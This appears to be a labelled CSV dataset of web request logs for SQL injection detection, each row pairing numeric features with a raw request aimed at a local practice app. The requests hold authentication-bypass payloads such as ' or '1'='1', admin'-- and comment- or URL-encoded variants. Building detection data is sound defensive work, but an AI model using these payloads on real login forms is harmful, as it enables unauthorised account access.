url_length,path_length,query_length,body_length,is_json_payload,json_depth,param_count_body,number_of_parameters,parameter_name_count,encoded_character_count,percent_encoded_count,single_quote_count,double_quote_count,semicolon_count,comma_count,parenthesis_count,dash_count,hash_count,asterisk_count,slash_count,equal_count,plus_count,whitespace_count,keyword_select,keyword_union,keyword_from,keyword_where,keyword_or,keyword_and,keyword_insert,keyword_update,keyword_delete,keyword_drop,keyword_alter,keyword_create,keyword_table,keyword_information_schema,keyword_sleep,keyword_benchmark,keyword_version,has_union_select,has_tautology,has_sql_comment,has_quote,has_subquery,has_information_schema,has_sleep,has_benchmark,has_if_function,has_case_when,has_exists,has_substring,has_ascii,has_length,has_database_function,has_version_function,has_system_variable,has_error_based_pattern,has_error_condition,nested_select_count,sql_function_count,comparison_count,logical_operator_count,method_get,method_post,status_code,is_error_response,response_size,response_time,ip_request_count,ip_unique_path_count,ip_unique_query_count,text,ip,timestamp,method,url,path,query,decoded_query,attack_type,label,label_source,request_hash
84,22,61,0,0,0,0,0,0,9,9,10,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,2645,1,13115,10,6928,username=' or '1'='1'&password=' or '1'='1',192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D%27+or+%271'%3D'1%27&password%3D%27+or+%271'%3D'1',/vulnerabilities/sqli/,username%3D%27+or+%271'%3D'1%27&password%3D%27+or+%271'%3D'1',username=' or '1'='1'&password=' or '1'='1',sqli_auth,1,existing_log_label,ff9bb464677dc8c5674517b98fd67398
113,22,90,0,0,0,0,2,8,12,12,0,0,0,0,0,0,0,0,3,2,6,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,2978,0,13115,10,6928,id=username%3D%27++Or++1%3D1++%2523%26password%3D123&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253D%2527%2B%2BOr%2B%2B1%253D1%2B%2B%252523%2526password%253D123&Submit=Submit,/vulnerabilities/sqli/,id=username%253D%2527%2B%2BOr%2B%2B1%253D1%2B%2B%252523%2526password%253D123&Submit=Submit,id=username%3D%27++Or++1%3D1++%2523%26password%3D123&Submit=Submit,sqli_auth,1,existing_log_label,d528ed9089cf3e6b60694e8bd45a16cd
219,22,196,0,0,0,0,2,8,31,31,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,3603,0,13115,10,6928,id=username%3D%22%2F%2A%2A%2FOr%2F%2A%2A%2F%221%22%3D%221%22%26password%3D%22%2F%2A%2A%2FOR%2F%2A%2A%2F%221%22%3D%221%22&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253D%2522%252F%252A%252A%252FOr%252F%252A%252A%252F%25221%2522%253D%25221%2522%2526password%253D%2522%252F%252A%252A%252FOR%252F%252A%252A%252F%25221%2522%253D%25221%2522&Submit=Submit,/vulnerabilities/sqli/,id=username%253D%2522%252F%252A%252A%252FOr%252F%252A%252A%252F%25221%2522%253D%25221%2522%2526password%253D%2522%252F%252A%252A%252FOR%252F%252A%252A%252F%25221%2522%253D%25221%2522&Submit=Submit,id=username%3D%22%2F%2A%2A%2FOr%2F%2A%2A%2F%221%22%3D%221%22%26password%3D%22%2F%2A%2A%2FOR%2F%2A%2A%2F%221%22%3D%221%22&Submit=Submit,sqli_auth,1,existing_log_label,b4bb158b7e336ce85eb53f954575f5e5
11,11,0,92,0,0,0,0,0,0,0,10,0,0,0,0,0,1,0,1,4,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,0,0,1,200,0,1031,0,13115,10,6928,username='%20OR%20'1'='1'&password='%20OR%20'1'='1'#,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_auth,1,existing_log_label,01d8dd836f54ef20b5d80301874c94b1
82,22,59,0,0,0,0,1,8,8,8,10,0,0,0,0,0,0,0,3,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,2657,0,13115,10,6928,username=' or '1'='1'&password=' OR '1'='1',192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username='+or+'1%27%3D'1%27&password%3D' OR+'1%27%3D%271%27,/vulnerabilities/sqli/,username='+or+'1%27%3D'1%27&password%3D' OR+'1%27%3D%271%27,username=' or '1'='1'&password=' OR '1'='1',sqli_auth,1,existing_log_label,11d8f77c6cb2beaa1d4978a759f8d04e
93,22,70,0,0,0,0,2,8,4,4,0,0,0,0,0,4,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,1926,0,13115,10,6928,id=username%3Dadmin%27--%26password%3Danything--&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253Dadmin%2527--%2526password%253Danything--&Submit=Submit,/vulnerabilities/sqli/,id=username%253Dadmin%2527--%2526password%253Danything--&Submit=Submit,id=username%3Dadmin%27--%26password%3Danything--&Submit=Submit,sqli_auth,1,existing_log_label,dbf23a7d2a041aeacbe58c1747bece55
22,22,0,64,0,0,1,0,0,0,0,0,10,0,0,0,0,1,0,3,4,0,6,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,0,1,200,0,4330,0,13115,10,6928,"username="" Or ""1""=""1""&password="" OR ""1""=""1""#",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,,sqli_auth,1,existing_log_label,8bb6f6e06e5f02aa08f64df697b6372c
80,22,57,0,0,0,0,2,16,0,0,5,0,0,0,0,3,0,8,11,3,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,4239,0,13115,10,6928,username=admin'/**/OR/**/'1'='1'/**/--/**/-&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=admin'/**/OR/**/'1'='1'/**/--/**/-&password=pass,/vulnerabilities/sqli/,username=admin'/**/OR/**/'1'='1'/**/--/**/-&password=pass,username=admin'/**/OR/**/'1'='1'/**/--/**/-&password=pass,sqli_auth,1,existing_log_label,1cd6e90ade28f498ebe35a20526a8667
60,22,37,0,0,0,0,1,8,2,2,1,0,0,0,0,3,0,0,3,2,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,4413,1,13115,10,6928,username=admin' -- -&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3Dadmin%27+--+-&password=123,/vulnerabilities/sqli/,username%3Dadmin%27+--+-&password=123,username=admin' -- -&password=123,sqli_auth,1,existing_log_label,a4431263477d562bfb636fbdca305887
55,22,18,0,0,0,0,1,8,0,0,1,0,0,0,0,0,0,0,3,2,0,3,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,2890,0,13115,10,6928,username=' Or 1=1,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=' Or 1=1 #&password=123,/vulnerabilities/sqli/,username=' Or 1=1 ,username=' Or 1=1 ,sqli_auth,1,existing_log_label,9e4a6c8c41d4777e03e76d6e87ac3222
77,22,54,0,0,0,0,2,16,4,4,5,0,1,0,0,3,0,0,3,3,0,5,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,3589,0,13115,10,6928,username=admin' Or '1'='1' ;-- -&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=admin'%20Or%20'1'='1'%20;--%20-&password=pass,/vulnerabilities/sqli/,username=admin'%20Or%20'1'='1'%20;--%20-&password=pass,username=admin' Or '1'='1' ;-- -&password=pass,sqli_auth,1,existing_log_label,8a49a94509fd694ce1fe28db0379c240
104,22,81,0,0,0,0,2,8,9,9,0,0,0,0,0,0,0,0,3,2,3,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1644,1,13115,10,6928,id=username%3D%27+Or+1%3D1+%2523%26password%3D123&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253D%2527%2BOr%2B1%253D1%2B%252523%2526password%253D123&Submit=Submit,/vulnerabilities/sqli/,id=username%253D%2527%2BOr%2B1%253D1%2B%252523%2526password%253D123&Submit=Submit,id=username%3D%27+Or+1%3D1+%2523%26password%3D123&Submit=Submit,sqli_auth,1,existing_log_label,05a6938b13c5a4d7c4719e674b35ad5f
96,22,73,0,0,0,0,2,8,5,5,0,0,0,0,0,2,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,1066,0,13115,10,6928,id=username%3Dadmin%27--%26password%3Danything%23&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253Dadmin%2527--%2526password%253Danything%2523&Submit=Submit,/vulnerabilities/sqli/,id=username%253Dadmin%2527--%2526password%253Danything%2523&Submit=Submit,id=username%3Dadmin%27--%26password%3Danything%23&Submit=Submit,sqli_auth,1,existing_log_label,8c47f23bc4204d5dd3e5a2a33c506474
177,22,154,0,0,0,0,2,8,21,21,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,2589,0,13115,10,6928,id=username%3D%27%2520OR%2520%271%27%3D%271%27%26password%3D%27%2520OR%2520%271%27%3D%271%27%2F%2A&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253D%2527%252520OR%252520%25271%2527%253D%25271%2527%2526password%253D%2527%252520OR%252520%25271%2527%253D%25271%2527%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=username%253D%2527%252520OR%252520%25271%2527%253D%25271%2527%2526password%253D%2527%252520OR%252520%25271%2527%253D%25271%2527%252F%252A&Submit=Submit,id=username%3D%27%2520OR%2520%271%27%3D%271%27%26password%3D%27%2520OR%2520%271%27%3D%271%27%2F%2A&Submit=Submit,sqli_auth,1,existing_log_label,c00d109d331a9c4e39a81c155571a89e
87,22,64,0,0,0,0,1,8,10,10,10,0,0,0,0,0,1,0,3,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,4158,0,13115,10,6928,username=' Or '1'='1'&password=' or '1'='1'#,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D'+Or+%271'%3D%271%27&password=%27+or+%271%27=%271'%23,/vulnerabilities/sqli/,username%3D'+Or+%271'%3D%271%27&password=%27+or+%271%27=%271'%23,username=' Or '1'='1'&password=' or '1'='1'#,sqli_auth,1,existing_log_label,8a5ed8806af72962d8b0958961a89d1a
88,22,65,0,0,0,0,0,0,11,11,5,0,0,0,0,0,0,1,4,3,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,3089,1,13115,10,6928,username=admin' OR '1'='1' /*&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3Dadmin%27+OR+%271%27%3D%271%27+%2F%2A%26password%3Dpass,/vulnerabilities/sqli/,username%3Dadmin%27+OR+%271%27%3D%271%27+%2F%2A%26password%3Dpass,username=admin' OR '1'='1' /*&password=pass,sqli_auth,1,existing_log_label,a2898f2c0dae5ddcceba23413c7cba42
150,22,127,0,0,0,0,2,8,18,18,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,2228,0,13115,10,6928,id=username%3D%27%09or%09%27%27%3D%27%26password%3D%27%09OR%09%27%27%3D%27%23&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253D%2527%2509or%2509%2527%2527%253D%2527%2526password%253D%2527%2509OR%2509%2527%2527%253D%2527%2523&Submit=Submit,/vulnerabilities/sqli/,id=username%253D%2527%2509or%2509%2527%2527%253D%2527%2526password%253D%2527%2509OR%2509%2527%2527%253D%2527%2523&Submit=Submit,id=username%3D%27%09or%09%27%27%3D%27%26password%3D%27%09OR%09%27%27%3D%27%23&Submit=Submit,sqli_auth,1,existing_log_label,fc91cb34d1cd851888fee6f19d27e783
125,22,102,0,0,0,0,2,8,12,12,0,0,0,0,0,2,0,0,3,2,3,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,1,1,0,200,0,1799,1,13115,10,6928,id=username%3Dadmin%27+OR+%271%27%3D%271%27+--%26password%3Dpass&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253Dadmin%2527%2BOR%2B%25271%2527%253D%25271%2527%2B--%2526password%253Dpass&Submit=Submit,/vulnerabilities/sqli/,id=username%253Dadmin%2527%2BOR%2B%25271%2527%253D%25271%2527%2B--%2526password%253Dpass&Submit=Submit,id=username%3Dadmin%27+OR+%271%27%3D%271%27+--%26password%3Dpass&Submit=Submit,sqli_auth,1,existing_log_label,3137d6e67a60313f6b6d3c5532b4c2ba
63,22,40,0,0,0,0,2,16,1,1,8,0,0,0,0,0,1,0,3,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,1679,1,13115,10,6928,username=' OR ''='&password=' or ''='#,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=' OR ''='&password=' or ''='%23,/vulnerabilities/sqli/,username=' OR ''='&password=' or ''='%23,username=' OR ''='&password=' or ''='#,sqli_auth,1,existing_log_label,922436cd06aba433746a1513e72ec56a
73,22,50,0,0,0,0,2,16,4,4,5,0,0,0,0,0,1,0,3,3,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,1747,0,13115,10,6928,username=admin' OR '1'='1' #&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=admin'%20OR%20'1'='1'%20%23&password=pass,/vulnerabilities/sqli/,username=admin'%20OR%20'1'='1'%20%23&password=pass,username=admin' OR '1'='1' #&password=pass,sqli_auth,1,existing_log_label,7762ce235f7ed1ac18449e122b65548f
155,22,132,0,0,0,0,2,8,19,19,0,0,0,0,0,0,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,4463,0,13115,10,6928,id=username%3D%27%2BOr%2B%27%27%3D%27%26password%3D%27%2Bor%2B%27%27%3D%27%2F%2A&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253D%2527%252BOr%252B%2527%2527%253D%2527%2526password%253D%2527%252Bor%252B%2527%2527%253D%2527%252F%252A&Submit=Submit,/vulnerabilities/sqli/,id=username%253D%2527%252BOr%252B%2527%2527%253D%2527%2526password%253D%2527%252Bor%252B%2527%2527%253D%2527%252F%252A&Submit=Submit,id=username%3D%27%2BOr%2B%27%27%3D%27%26password%3D%27%2Bor%2B%27%27%3D%27%2F%2A&Submit=Submit,sqli_auth,1,existing_log_label,f15aaf0398c9d70ab66711d380175f3d
114,22,91,0,0,0,0,0,0,20,20,8,0,0,0,0,2,0,8,11,4,0,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,2253,0,13115,10,6928,username='/**/OR/**/''='&password='/**/OR/**/''='--,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D'/%2A%2A%2FOR%2F*%2A/%27%27%3D'&password%3D%27%2F**%2FOR%2F%2A%2A%2F%27%27%3D'--,/vulnerabilities/sqli/,username%3D'/%2A%2A%2FOR%2F*%2A/%27%27%3D'&password%3D%27%2F**%2FOR%2F%2A%2A%2F%27%27%3D'--,username='/**/OR/**/''='&password='/**/OR/**/''='--,sqli_auth,1,existing_log_label,6ca9310ac22e87b3a2d2763c9c69d74d
10,10,0,36,0,0,0,0,0,0,0,1,0,0,0,0,0,1,0,1,2,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,200,0,4114,0,13115,10,6928,username=admin' #&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/login.php,/login.php,,,sqli_auth,1,existing_log_label,028afcbfbc2215f19657d68156adce86
11,11,0,51,0,0,0,0,0,0,0,1,0,1,0,0,5,0,0,1,2,0,4,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,200,0,2025,0,13115,10,6928,username=admin'--&password=anything;--  -,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_auth,1,existing_log_label,68473973fc9fd94c18db8a13326d69ae
22,22,0,57,0,0,2,0,0,0,0,0,10,0,0,0,2,0,0,3,4,0,6,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,0,1,200,0,797,1,13115,10,6928,"username="" oR ""1""=""1""&password="" OR ""1""=""1""--",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,,sqli_auth,1,existing_log_label,f9da21d37cbbd4615c0ddb7707399e62
10,10,0,91,0,0,0,0,0,0,0,0,0,0,0,0,2,0,0,1,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,200,0,3773,1,13115,10,6928,username%3Dadmin%27%2BOR%2B%271%27%3D%271%27%2B--%26password%3Dpass,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/login.php,/login.php,,,sqli_auth,1,existing_log_label,b44f7aa263280527c42cd33d717a1120
71,22,48,0,0,0,0,2,16,0,0,1,0,1,0,0,3,0,8,11,3,0,1,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,783,0,13115,10,6928,username='/**/OR/**/1=1/**/;--/**/-&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username='/**/OR/**/1=1/**/;--/**/-&password=123,/vulnerabilities/sqli/,username='/**/OR/**/1=1/**/;--/**/-&password=123,username='/**/OR/**/1=1/**/;--/**/-&password=123,sqli_auth,1,existing_log_label,2d7f08a7d7faeabe2c5383ceab8ba815
11,11,0,45,0,0,2,0,0,0,0,0,10,0,0,0,0,0,1,2,4,0,6,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,0,1,200,0,2468,0,13115,10,6928,"username="" or ""1""=""1""&password="" Or ""1""=""1""/*",192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/search.php,/search.php,,,sqli_auth,1,existing_log_label,4a5ee7d5f8c0517035ce0fdd87e075a2
72,22,49,0,0,0,0,2,16,0,0,8,0,0,0,0,0,0,8,11,4,0,1,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,3094,0,13115,10,6928,username='/**/OR/**/''='&password='/**/or/**/''=',192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username='/**/OR/**/''='&password='/**/or/**/''=',/vulnerabilities/sqli/,username='/**/OR/**/''='&password='/**/or/**/''=',username='/**/OR/**/''='&password='/**/or/**/''=',sqli_auth,1,existing_log_label,1f035caffe9897c6641cb5df5e9022a1
59,22,36,0,0,0,0,1,8,2,2,1,0,0,0,0,2,0,0,3,2,0,3,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,3523,0,13115,10,6928,username=admin'  --&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=admin%27++--&password%3D123,/vulnerabilities/sqli/,username=admin%27++--&password%3D123,username=admin'  --&password=123,sqli_auth,1,existing_log_label,240c9a632c058b1936697088e6e9106b
98,22,75,0,0,0,0,0,0,15,15,0,10,0,0,0,2,0,0,3,4,0,5,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,1662,1,13115,10,6928,"username="" OR ""1""=""1""&password="" OR ""1""=""1""--",192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3D%22+OR+%221%22%3D%221%22%26password%3D%22+OR+%221%22%3D%221%22--,/vulnerabilities/sqli/,username%3D%22+OR+%221%22%3D%221%22%26password%3D%22+OR+%221%22%3D%221%22--,"username="" OR ""1""=""1""&password="" OR ""1""=""1""--",sqli_auth,1,existing_log_label,9d369196356cd6affe13f2dded84b7da
111,22,88,0,0,0,0,2,8,9,9,0,0,0,0,0,3,0,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,2629,0,13115,10,6928,id=username%3D%27%2BoR%2B1%3D1%2B--%2B-%26password%3D123&Submit=Submit,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?id=username%253D%2527%252BoR%252B1%253D1%252B--%252B-%2526password%253D123&Submit=Submit,/vulnerabilities/sqli/,id=username%253D%2527%252BoR%252B1%253D1%252B--%252B-%2526password%253D123&Submit=Submit,id=username%3D%27%2BoR%2B1%3D1%2B--%2B-%26password%3D123&Submit=Submit,sqli_auth,1,existing_log_label,9f682e6ae2d62c27a3ac7060ff4bd3c9
56,22,33,0,0,0,0,1,8,1,1,1,0,0,0,0,2,0,0,3,2,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,2080,0,13115,10,6928,username=admin' --&password=123,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username%3Dadmin'+--&password=123,/vulnerabilities/sqli/,username%3Dadmin'+--&password=123,username=admin' --&password=123,sqli_auth,1,existing_log_label,453b6031e5afa67b1ba6eabf7ea553c5
85,22,62,0,0,0,0,1,8,10,10,5,0,0,0,0,0,1,0,3,3,0,4,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,1,0,200,0,3435,0,13115,10,6928,username=admin' OR '1'='1' #&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=admin%27%20OR%20%271%27%3D%271'%20%23&password%3Dpass,/vulnerabilities/sqli/,username=admin%27%20OR%20%271%27%3D%271'%20%23&password%3Dpass,username=admin' OR '1'='1' #&password=pass,sqli_auth,1,existing_log_label,7762ce235f7ed1ac18449e122b65548f
22,22,0,53,0,0,2,0,0,0,0,5,0,0,0,0,3,0,0,3,3,0,6,0,0,0,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,3,1,0,1,200,0,2232,0,13115,10,6928,username=admin' OR '1'='1' -- -&password=pass,192.168.145.135,12/Sep/2026:14:16:10 +0700,POST,/vulnerabilities/sqli/,/vulnerabilities/sqli/,,,sqli_auth,1,existing_log_label,60504f6f88590488916afeaa2503f057
65,22,42,0,0,0,0,1,8,3,3,1,0,0,0,0,2,1,0,3,2,0,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,0,1,0,200,0,3731,1,13115,10,6928,username=admin'--&password=anything#,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username=admin%27--&password%3Danything%23,/vulnerabilities/sqli/,username=admin%27--&password%3Danything%23,username=admin'--&password=anything#,sqli_auth,1,existing_log_label,dcacce870d91f1646fb213e961ba114a
75,22,52,0,0,0,0,2,16,5,5,8,0,1,0,0,3,0,0,3,4,0,6,0,0,0,0,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,4,2,1,0,200,0,1698,0,13115,10,6928,username=' or ''='&password=' or ''=';-- -,192.168.145.135,12/Sep/2026:14:16:10 +0700,GET,/vulnerabilities/sqli/?username='%20or%20''='&password='%20or%20''=';--%20-,/vulnerabilities/sqli/,username='%20or%20''='&password='%20or%20''=';--%20-,username=' or ''='&password=' or ''=';-- -,sqli_auth,1,existing_log_label,23c76c1319845fae2ee47fd16175b006
